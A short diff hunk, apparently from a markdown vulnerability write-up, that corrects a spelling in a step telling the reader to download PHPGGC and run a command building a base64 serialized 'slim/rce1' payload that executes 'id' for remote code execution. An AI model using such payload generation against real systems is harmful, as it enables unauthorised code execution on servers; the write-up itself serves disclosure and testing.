@@ -25,7 +25,7 @@
 <br /> <br />
 
 
-**Step 6:** Download the PHPGGC utility from the following location to generate the serealized payload using the following command and capture the generated payload.<br />
+**Step 6:** Download the PHPGGC utility from the following location to generate the serialised payload using the following command and capture the generated payload.<br />
 PHPGGC Location: https://github.com/ambionics/phpggc
 ```
 ./phpggc -b slim/rce1 system id
